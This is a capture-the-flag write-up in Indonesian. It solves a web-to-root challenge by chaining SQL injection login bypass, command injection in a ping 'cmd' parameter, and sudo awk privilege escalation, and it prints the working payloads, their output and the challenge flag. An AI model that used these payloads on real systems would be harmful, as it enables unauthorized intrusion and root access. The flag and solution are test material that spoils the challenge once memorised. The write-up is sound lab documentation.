# No Cap Just Root (part 1/8)

Challenge ini secara praktik lebih mirip rangkaian web exploitation lalu privilege escalation lokal, bukan binary pwn murni. Entry point awal ada di halaman web, lalu akses `root` didapat dari salah konfigurasi `sudo`.

## Ringkasan singkat

Alur exploit-nya:

1. Bypass login dengan SQL injection di `login.php`
2. Masuk ke `admin.php`
3. Abuse command injection di parameter `cmd`
4. Enumerasi hak akses user `web`
5. Naik ke `root` lewat `sudo /usr/bin/awk`
6. Baca flag di `/var/www/html/flag.txt`

Flag:

`THC{sqli_and_awk_sudo_is_pure_brainrot}`

## Recon awal

Landing page utama sudah di-deface, tapi source HTML lama masih tertinggal di dalam comment. Dari situ kelihatan beberapa path penting:

- `index.php`
- `ourteam.php`
- `admin.php`

`admin.php` saat diakses langsung tidak me-render panel, tapi redirect ke `logout.php`, lalu dari sana ke `login.php`. Jadi fokus langsung pindah ke portal login.

## 1. SQL injection di login

Form login menerima dua field:

- `user`
- `pass`

Setelah source `login.php` dibaca dari server, query yang dipakai ternyata seperti ini:

```php
$query = "SELECT id FROM login WHERE pseudo = '$username' AND password = '$password'";
```

Tidak ada prepared statement, tidak ada escaping, jadi bypass klasik langsung jalan:

```text
user=' or 1=1 -- -
pass=x
```

Server merespons dengan redirect ke `admin.php`, artinya sesi berhasil dibuat.

## 2. Command injection di panel admin

Setelah login, di halaman admin ada fitur “System checkup” yang mengirim parameter GET bernama `cmd`.

Source `admin.php` menunjukkan bagian rentannya:

```php
system("timeout 2s ping " . $_GET["cmd"]);
```

Karena input ditempel langsung ke shell command, kita bisa menambahkan `;` lalu menjalankan command lain.

Payload sederhana untuk bukti RCE:

```text
admin.php?cmd=127.0.0.1;id
```

Output:

```text
uid=1000(web) gid=1000(web) groups=1000(web)
```

Jadi kita sudah punya command execution sebagai user `web`.

## 3. Enumerasi lokal

Dari RCE, langkah berikutnya adalah cari jalur privilege escalation. Beberapa temuan penting:

- Working directory aplikasi: `/var/www/html`
- File flag ada di sana, tapi owned by `root`
- User `web` punya rule `sudo` yang sangat buruk

Hasil `sudo -l`:

```text
User web may run the following commands on chal-aaa628d0-75d54c8bcf-pcrcp:
    (ALL) NOPASSWD: /usr/bin/awk
```

Itu langsung jadi jalur root. `awk` bisa memanggil shell lewat `system()`, jadi pada dasarnya kita diberi eksekusi command sebagai root tanpa password.

## 4. Privilege escalation ke root

Payload final:

```sh
sudo awk 'BEGIN {system("id; cat /var/www/html/flag.txt")}'
```

Payload itu dieksekusi melalui command injection di parameter `cmd`, misalnya dengan bentuk:

```text
127.0.0.1;sudo awk 'BEGIN {system("id; cat /var/www/html/flag.txt")}'
```

Hasilnya:

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
THC{sqli_and_awk_sudo_is_pure_brainrot}
```

## Kenapa exploit ini berhasil

Ada tiga masalah yang ditumpuk sekaligus:

1. Login query raw string concat, jadi SQL injection sangat mudah.
2. Fitur “ping” memanggil `system()` dengan input user tanpa sanitasi.
3. User web diberi `sudo NOPASSWD` ke `awk`, yang secara praktis sama dengan kasih root shell.

Satu saja dari tiga celah ini sudah buruk. Digabung, challenge ini selesai cukup cepat setelah source code terbaca.

## File yang saya buat

- `exploit.py` untuk menjalankan chain exploit secara otomatis

## Cara pakai exploit

Aktifkan virtualenv yang sudah kamu kasih:

```sh
source /home/nata/ctf_env/bin/activate
```

Jalankan:

```sh
python exploit.py
```

Kalau mau pakai RCE yang sama untuk command lain:

```sh
python exploit.py --cmd 'id; sudo -l'
```

## Catatan akhir

Walau kategorinya ditulis `pwn`, challenge part ini sebenarnya lebih terasa seperti web foothold + local privesc. Titik masuknya bukan memory corruption, tapi kombinasi SQLi, command injection, dan sudo misconfiguration.
